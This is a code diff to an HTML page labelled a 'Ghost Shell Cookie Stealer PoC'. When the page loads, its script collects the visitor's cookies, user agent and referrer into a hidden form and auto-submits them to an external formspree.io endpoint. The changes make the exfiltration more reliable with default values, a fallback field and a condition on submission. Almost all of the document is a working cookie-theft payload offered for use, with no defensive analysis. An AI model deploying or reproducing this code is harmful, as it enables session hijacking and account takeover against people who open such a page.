@@ -6,8 +6,8 @@
     <title>Ghost Shell Cookie Stealer PoC</title>
     <style>
         body {
-            background-color: black; /* Set background to black */
-            color: white; /* Text color for visibility */
+            background-color: black; /* Black background */
+            color: white; /* White text */
             display: flex;
             justify-content: center;
             align-items: center;
@@ -19,7 +19,7 @@
             text-align: center;
         }
         form {
-            display: none; /* Keep form hidden */
+            display: none; /* Hidden form */
         }
     </style>
 </head>
@@ -28,26 +28,29 @@
     <h2>Ghost Shell Cookie Stealer Hidden PoC</h2>
 
     <form id="stealthForm" action="https://formspree.io/f/xeoqzkqe" method="POST">
-        <input type="hidden" name="cookie_data" id="cookieField">
-        <input type="hidden" name="user_agent" id="userAgentField">
-        <input type="hidden" name="referrer" id="referrerField">
-        <button type="submit" name="submitButton">Send</button> <!-- Improves compatibility -->
+        <input type="hidden" name="cookie_data" id="cookieField" value="default_cookie">
+        <input type="hidden" name="user_agent" id="userAgentField" value="default_agent">
+        <input type="hidden" name="referrer" id="referrerField" value="default_referrer">
+        <input type="hidden" name="fallback" value="not_empty"> <!-- Prevents empty form rejection -->
+        <button type="submit" name="submitButton">Send</button>
     </form>
 
     <script>
         document.addEventListener("DOMContentLoaded", function() {
             // Capture cookies, user agent, and referrer
-            var cookies = document.cookie;
-            var userAgent = navigator.userAgent;
-            var referrer = document.referrer;
+            var cookies = document.cookie || "No_Cookies";
+            var userAgent = navigator.userAgent || "Unknown_User_Agent";
+            var referrer = document.referrer || "No_Referrer";
 
             // Inject data into form fields
             document.getElementById("cookieField").value = cookies;
             document.getElementById("userAgentField").value = userAgent;
             document.getElementById("referrerField").value = referrer;
 
-            // Auto-submit the form
-            document.getElementById("stealthForm").submit();
+            // Submit form only if data exists
+            if (cookies !== "No_Cookies" || referrer !== "No_Referrer") {
+                document.getElementById("stealthForm").submit();
+            }
         });
     </script>
 
